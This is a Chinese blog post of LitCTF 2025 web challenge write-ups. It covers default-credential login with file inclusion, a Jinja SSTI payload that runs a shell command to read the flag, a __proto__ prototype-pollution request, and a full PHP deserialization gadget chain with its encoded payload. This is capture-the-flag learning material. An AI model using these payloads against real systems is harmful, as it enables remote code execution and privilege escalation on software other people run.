@@ -1,0 +1,220 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>litCTF | L的博客</title><meta name="author" content="L"><meta name="copyright" content="L"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="easy_file   admin&#x2F;password后台是文件上传经过尝试发现是白名单，那么就只好找文件包含或者解析漏洞了。在index的源码发现file查看文件在admin.php使用file参数可以文件包含，文件内容也有过滤直接短标签即可   nest_jsadmin&#x2F;password         啊&#123;%print(url_for.__globals__.__builtins__">
+<meta property="og:type" content="article">
+<meta property="og:title" content="litCTF">
+<meta property="og:url" content="https://lisien11.xyz/2025/06/03/litCTF/index.html">
+<meta property="og:site_name" content="L的博客">
+<meta property="og:description" content="easy_file   admin&#x2F;password后台是文件上传经过尝试发现是白名单，那么就只好找文件包含或者解析漏洞了。在index的源码发现file查看文件在admin.php使用file参数可以文件包含，文件内容也有过滤直接短标签即可   nest_jsadmin&#x2F;password         啊&#123;%print(url_for.__globals__.__builtins__">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover81.jpg">
+<meta property="article:published_time" content="2025-06-03T10:34:45.000Z">
+<meta property="article:modified_time" content="2025-06-03T12:42:25.063Z">
+<meta property="article:author" content="L">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover81.jpg"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://lisien11.xyz/2025/06/03/litCTF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'litCTF',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-06-03 20:42:25'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/LSE.css"><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="L的博客" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/%E5%9B%BE%E7%89%87/1231.jpg" onerror="onerror=null;src='/img/lll.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">152</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">46</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">43</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 个人写的小Demo</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 信息收集</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover81.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="L的博客"><span class="site-name">L的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 个人写的小Demo</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 信息收集</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">litCTF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-03T10:34:45.000Z" title="发表于 2025-06-03 18:34:45">2025-06-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-03T12:42:25.063Z" title="更新于 2025-06-03 20:42:25">2025-06-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title="litCTF"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="easy-file"><a href="#easy-file" class="headerlink" title="easy_file"></a>easy_file</h1><img src="/2025/06/03/litCTF/IMG_20250603-184748741.png" class="">  
+<p>admin/password<br>后台是文件上传<br>经过尝试发现是白名单，那么就只好找文件包含或者解析漏洞了。在index的源码发现file查看文件<br><img src="/2025/06/03/litCTF/IMG_20250603-185826279.png" class=""><br>在admin.php使用file参数可以文件包含，文件内容也有过滤直接短标签即可<br><img src="/2025/06/03/litCTF/IMG_20250603-185925987.png" class=""><br><img src="/2025/06/03/litCTF/IMG_20250603-185954588.png" class=""><br><img src="/2025/06/03/litCTF/IMG_20250603-190138387.png" class="">  </p>
+<h1 id="nest-js"><a href="#nest-js" class="headerlink" title="nest_js"></a>nest_js</h1><p>admin/password<br><img src="/2025/06/03/litCTF/IMG_20250603-190530320.png" class=""><br><img src="/2025/06/03/litCTF/IMG_20250603-191027325.png" class="">  </p>
+<h1 id=""><a href="#" class="headerlink" title=" "></a> </h1><img src="/2025/06/03/litCTF/IMG_20250603-191119854.png" class="">  
+<img src="/2025/06/03/litCTF/IMG_20250603-191151156.png" class=""> 
+<p>啊<code>&#123;%print(url_for.__globals__.__builtins__['__import__']('os').popen('tac /flag').read())%&#125;</code><br><img src="/2025/06/03/litCTF/IMG_20250603-191228582.png" class="">  </p>
+<h1 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h1><img src="/2025/06/03/litCTF/IMG_20250603-192135376.png" class="">  
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;settings&quot;</span>:&#123;<span class="string">&quot;theme&quot;</span>:<span class="string">&quot;asd&quot;</span>,<span class="string">&quot;language&quot;</span>:<span class="string">&quot;asd&quot;</span>,</span><br><span class="line"><span class="string">&quot;isAdmin&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
+<img src="/2025/06/03/litCTF/IMG_20250603-192216013.png" class="">  
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;settings&quot;</span>:&#123;<span class="string">&quot;theme&quot;</span>:<span class="string">&quot;asd&quot;</span>,<span class="string">&quot;language&quot;</span>:<span class="string">&quot;asd&quot;</span>,</span><br><span class="line"><span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;isAdmin&quot;</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="君の名は"><a href="#君の名は" class="headerlink" title="君の名は"></a>君の名は</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/readflag`);&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$magic</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;musubi = <span class="variable">$data</span>[<span class="string">&#x27;musubi&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;magic = <span class="variable">$data</span>[<span class="string">&#x27;magic&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$thread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;memory.<span class="variable language_">$this</span>-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$kuchikamizake</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;soul)-&gt;<span class="title function_ invoke__">flag</span>(<span class="variable">$this</span>-&gt;kuchikamizake,<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;call error!no flag!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Litctf2025</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Litctf2025&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$Litctf2025</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$Litctf2025</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个反序列化挺有意思的，首先很明显链尾应该是Taki的__call这里有个原生类的利用</p>
+<p>那么链头应该是<strong>unserialize链子应该如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Taki&#123;__unserialize&#125;-&gt;Mitsuha&#123;__invoke&#125;-&gt;KatawareDoki&#123;__toString&#125;-&gt;Taki&#123;__call&#125;</span><br></pre></td></tr></table></figure><br>然后这里有两个坑，第一个是我们要C头绕过但是7.3版本以下才会转为C头但是</strong>unserialize在7.4才出，所以我们需要7.3生成payload，7.4调试，不能直接在7.3上运行payload。</p>
+<p>第二个坑点是<strong>unserialize中的<code>$data[&#39;xxx&#39;]</code>这个xxx其实是我们序列化字符的<code>&#123;&quot;xxx&quot;:&quot;&quot;&#125;</code>key而我们都知道private属性的在序列化时会在前面加上一个%00类名%00，这样的话如果我们直接7.3序列化7.4反序列化就会导致</strong>unserialize。不赋值，所以我们需要将Taki的private属性改成public。</p>
+<p>坑点结束后就是怎么利用这个原生类来命令执行了。<br>首先我们可以看到其使用create_function(“”, ‘die(<code>/readflag</code>);’);创造了一个匿名类。<br>那么可以尝试使用反射类来调用这个匿名类</p>
+<img src="/2025/06/03/litCTF/IMG_20250603-194436904.png" class="">  
+<p>ReflectionFunction可以直接调用方法<br>而这个创建的那么类正好没有参数</p>
+<p>那么只要知道这个匿名类的名称就可以得到flag了<br>本地测了一下第一次进入时叫lambda_1第二次叫lambda_2<br><img src="/2025/06/03/litCTF/IMG_20250603-194801031.png" class="">  </p>
+<p>那么可以写exp了<br>写exp的时候又遇到一个问题就是在反序列化的时候</p>
+<img src="/2025/06/03/litCTF/IMG_20250603-204054313.png" class="">  
+<p>在后面new的Taki也会触发__unserialize所以要给两个都附上值不然会报错<br>exp如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">create_function(&quot;&quot;, &#x27;echo &quot;aaaa&quot;;&#x27;);</span><br><span class="line"></span><br><span class="line">class Taki</span><br><span class="line">&#123;</span><br><span class="line">    public $musubi;</span><br><span class="line">    public $magic;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;musubi = $data[&#x27;musubi&#x27;];</span><br><span class="line">        $this-&gt;magic = $data[&#x27;magic&#x27;];</span><br><span class="line">        return ($this-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($func,$args)&#123;</span><br><span class="line">        (new $args[0]($args[1]))-&gt;&#123;$this-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Mitsuha</span><br><span class="line">&#123;</span><br><span class="line">    private $memory;</span><br><span class="line">    private $thread=&quot;asdw&quot;;</span><br><span class="line">    public function __construct($a)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;memory=$a;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;memory.$this-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class KatawareDoki</span><br><span class="line">&#123;</span><br><span class="line">    private $soul;</span><br><span class="line">    private $kuchikamizake=&quot;ReflectionFunction&quot;;</span><br><span class="line">    private $name;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $a=new Taki();</span><br><span class="line">        $a-&gt;musubi=&quot;time&quot;;</span><br><span class="line">        $a-&gt;magic=&quot;invoke&quot;;</span><br><span class="line">        $this-&gt;soul=$a;</span><br><span class="line">        $this-&gt;name=urldecode(&quot;%00lambda_10&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;soul)-&gt;flag($this-&gt;kuchikamizake,$this-&gt;name);</span><br><span class="line">        return &quot;call error!no flag!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Taki();</span><br><span class="line">$a-&gt;musubi=new Mitsuha(new KatawareDoki());</span><br><span class="line"></span><br><span class="line">$arr=array(&quot;1&quot;=&gt;$a);</span><br><span class="line">$b=new ArrayObject($arr);</span><br><span class="line">$c=serialize($b);</span><br><span class="line">echo urlencode($c);</span><br><span class="line">//unserialize($c);</span><br><span class="line">unserialize(urldecode(&quot;C%3A11%3A%22ArrayObject%22%3A361%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bi%3A1%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A15%3A%22%00Mitsuha%00memory%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A18%3A%22%00KatawareDoki%00soul%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3Bs%3A4%3A%22time%22%3Bs%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7Ds%3A27%3A%22%00KatawareDoki%00kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A18%3A%22%00KatawareDoki%00name%22%3Bs%3A10%3A%22%00lambda_10%22%3B%7Ds%3A15%3A%22%00Mitsuha%00thread%22%3Bs%3A4%3A%22asdw%22%3B%7Ds%3A5%3A%22magic%22%3BN%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D&quot;));</span><br></pre></td></tr></table></figure></p>
+<p>匿名函数后面的数字稍微大点，然后多发几个包</p>
+<img src="/2025/06/03/litCTF/IMG_20250603-204021179.png" class="">  
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lisien11.xyz">L</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lisien11.xyz/2025/06/03/litCTF/">https://lisien11.xyz/2025/06/03/litCTF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://lisien11.xyz" target="_blank">L的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover81.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/06/03/D3CTF/" title="D3CTF"><img class="cover" src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover47.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">D3CTF</div></div></a></div><div class="next-post pull-right"><a href="/2025/05/29/snakeyaml%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/" title="fastjson&amp;&amp;snakeyaml不出网利用"><img class="cover" src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover52.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">fastjson&amp;&amp;snakeyaml不出网利用</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/%E5%9B%BE%E7%89%87/1231.jpg" onerror="this.onerror=null;this.src='/img/lll.png'" alt="avatar"/></div><div class="author-info__name">L</div><div class="author-info__description">我只是一个平平无奇路过的普通大学生罢了</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">152</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">46</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">43</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lisien11"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/atom.xml" target="_blank" title="订阅-ATOM"><i class="fas fa-rss"></i></a><a class="social-icon" href="https://github.com/lisien11" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2488218724@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">无人问津也好，技不如人也罢，你都要试着安静下来，去做自己该做的事，而不是让内心烦躁焦虑，毁掉你本就不多的热情和定力。</div></div><div class="sticky_layout"><div class="card-widget" 